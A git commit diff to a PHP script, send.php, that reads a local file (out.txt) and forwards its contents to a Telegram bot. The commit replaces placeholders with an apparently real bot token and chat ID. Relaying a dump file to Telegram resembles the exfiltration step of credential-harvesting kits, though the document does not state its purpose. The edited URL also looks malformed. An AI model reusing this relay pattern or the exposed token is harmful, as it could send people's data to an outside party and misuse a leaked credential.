ac96f8d2ac89b8f2dafd602dcb94e065b652c87a
KAMElYAR <amirking138558138558@gmail.com>
2025-10-16 16:21:25 +0330

    Update send.php

--- my-folder/send.php
+++ my-folder/send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/8223992925:AAE8R0yTj540UaQ1duMOPpfC7PsC3Z-j5os/sendMessage?chat_id=1196450049&text=$msg");
 ?>
